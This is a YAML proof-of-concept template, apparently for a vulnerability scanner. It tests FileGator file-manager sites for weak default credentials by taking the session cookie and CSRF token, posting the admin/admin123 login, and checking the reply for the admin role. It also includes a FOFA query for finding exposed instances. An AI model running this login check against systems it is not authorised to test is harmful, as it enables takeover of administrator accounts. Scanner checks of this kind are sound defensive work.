id: poc-yaml-filegator-weak-password
info:
  name: filegator 弱口令漏洞
  severity: high
  tags:
  - 弱口令
  finger: filegator
  fofa: title="FileGator"
requests:
- method: GET
  path: /
  expression: status_code == 200
  output:
  - regex_match(headers,"filegator=(?P<cookie>.*?);")
  - regex_match(headers,"(?P<token>[0-9a-zA-Z-_]{43})")
- method: POST
  path: /?r=/login
  headers:
    Content-Type: application/json
    Cookie: filegator={{.cookie}}
    X-Csrf-Token: '{{.token}}'
  data: '{"username":"admin","password":"admin123"}'
  expression: status_code == 200 && contains(body,"role\":\"admin") && contains(body,`permissions":[`)
    && contains(content_type,"application/json")
variables: {}
transport: http
